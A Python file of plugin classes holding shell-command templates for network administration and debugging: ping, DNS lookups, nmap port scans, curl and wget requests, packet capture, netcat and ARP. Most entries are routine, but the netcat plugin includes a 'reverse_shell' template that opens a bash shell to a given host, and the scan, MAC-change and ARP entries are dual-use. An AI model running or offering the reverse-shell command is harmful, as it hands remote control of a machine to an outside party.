"""
Networking Plugins - Network administration and debugging commands.
"""


class PingPlugin:
    """Network connectivity testing."""
    
    TEMPLATES = {
        "ping": "ping -c 4 {host}",
        "ping_continuous": "ping {host}",
        "traceroute": "traceroute {host}",
        "tracepath": "tracepath {host}",
        "mtr": "mtr {host}",
    }


class DNSPlugin:
    """DNS lookup commands."""
    
    SYSTEM_PROMPT = """You are a DNS expert. Generate dig/nslookup commands.
Output only the command."""
    
    TEMPLATES = {
        "lookup": "dig {domain}",
        "lookup_short": "dig +short {domain}",
        "mx_records": "dig MX {domain}",
        "ns_records": "dig NS {domain}",
        "txt_records": "dig TXT {domain}",
        "reverse": "dig -x {ip}",
        "trace": "dig +trace {domain}",
        "any": "dig ANY {domain}",
        "nslookup": "nslookup {domain}",
        "whois": "whois {domain}",
    }


class PortPlugin:
    """Port scanning and checking."""
    
    TEMPLATES = {
        "check_port": "nc -zv {host} {port}",
        "scan_range": "nmap -p {start}-{end} {host}",
        "quick_scan": "nmap -F {host}",
        "full_scan": "nmap -sV -sC {host}",
        "udp_scan": "nmap -sU {host}",
        "list_open": "ss -tulpn",
        "netstat": "netstat -tulpn",
    }


class CurlPlugin:
    """HTTP request commands."""
    
    SYSTEM_PROMPT = """You are a curl expert. Generate curl commands for HTTP requests.
Include headers, authentication, and data as needed."""
    
    TEMPLATES = {
        "get": "curl -s {url}",
        "get_headers": "curl -I {url}",
        "get_verbose": "curl -v {url}",
        "post_json": "curl -X POST -H 'Content-Type: application/json' -d '{data}' {url}",
        "post_form": "curl -X POST -d '{data}' {url}",
        "put": "curl -X PUT -H 'Content-Type: application/json' -d '{data}' {url}",
        "delete": "curl -X DELETE {url}",
        "auth_basic": "curl -u {user}:{password} {url}",
        "auth_bearer": "curl -H 'Authorization: Bearer {token}' {url}",
        "download": "curl -O {url}",
        "follow_redirects": "curl -L {url}",
        "timing": "curl -w '@-' -o /dev/null -s {url} <<< 'time_total: %{time_total}\\n'",
    }


class WgetPlugin:
    """File download commands."""
    
    TEMPLATES = {
        "download": "wget {url}",
        "download_as": "wget -O {filename} {url}",
        "recursive": "wget -r -np {url}",
        "continue": "wget -c {url}",
        "mirror": "wget --mirror {url}",
        "background": "wget -b {url}",
        "limit_rate": "wget --limit-rate={rate} {url}",
    }


class InterfacePlugin:
    """Network interface commands."""
    
    TEMPLATES = {
        "ip_addr": "ip addr",
        "ip_link": "ip link",
        "ip_route": "ip route",
        "ifconfig": "ifconfig",
        "ifup": "ifup {interface}",
        "ifdown": "ifdown {interface}",
        "dhcp_renew": "dhclient -r && dhclient {interface}",
        "set_ip": "ip addr add {ip}/{mask} dev {interface}",
        "mac_address": "ip link show {interface} | grep ether",
        "change_mac": "ip link set dev {interface} address {mac}",
    }


class BandwidthPlugin:
    """Bandwidth testing and monitoring."""
    
    TEMPLATES = {
        "speedtest": "speedtest-cli",
        "iperf_server": "iperf3 -s",
        "iperf_client": "iperf3 -c {host}",
        "iftop": "iftop -i {interface}",
        "nethogs": "nethogs {interface}",
        "bmon": "bmon",
    }


class TCPDumpPlugin:
    """Packet capture commands."""
    
    TEMPLATES = {
        "capture_all": "tcpdump -i {interface}",
        "capture_host": "tcpdump -i {interface} host {host}",
        "capture_port": "tcpdump -i {interface} port {port}",
        "capture_file": "tcpdump -i {interface} -w {file}.pcap",
        "read_file": "tcpdump -r {file}.pcap",
        "http_traffic": "tcpdump -i {interface} 'port 80 or port 443'",
        "dns_traffic": "tcpdump -i {interface} 'port 53'",
    }


class NetcatPlugin:
    """Netcat networking utility."""
    
    TEMPLATES = {
        "listen": "nc -l -p {port}",
        "connect": "nc {host} {port}",
        "scan": "nc -zv {host} {port}",
        "transfer_send": "nc -l -p {port} < {file}",
        "transfer_receive": "nc {host} {port} > {file}",
        "reverse_shell": "nc -e /bin/bash {host} {port}",
    }


class ArpPlugin:
    """ARP commands."""
    
    TEMPLATES = {
        "arp_table": "arp -a",
        "arp_scan": "arp-scan --localnet",
        "add_entry": "arp -s {ip} {mac}",
        "delete_entry": "arp -d {ip}",
    }
